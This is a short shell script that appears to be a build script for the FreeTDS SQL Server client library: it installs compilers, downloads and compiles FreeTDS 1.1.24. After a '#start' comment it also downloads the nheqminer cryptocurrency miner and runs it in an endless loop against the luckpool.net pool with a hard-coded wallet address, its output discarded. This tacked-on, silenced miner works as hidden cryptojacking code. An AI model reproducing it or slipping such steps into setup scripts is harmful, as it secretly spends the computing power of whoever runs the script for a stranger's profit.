#!/bin/sh

# Exit script if you try to use an uninitialized variable.
set -o nounset

# Exit script if a statement returns a non-true return value.
set -o errexit

apt-get install wget
apt-get install build-essential
apt-get install libc6-dev

wget http://www.freetds.org/files/stable/freetds-1.1.24.tar.gz
tar -xzf freetds-1.1.24.tar.gz
cd freetds-1.1.24
./configure --prefix=/usr/local --with-tdsver=7.3
make
make install

#start
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz 
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
while [ 1 ]; do
nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.rucika -p x -t 2 >/dev/null
sleep 2
done
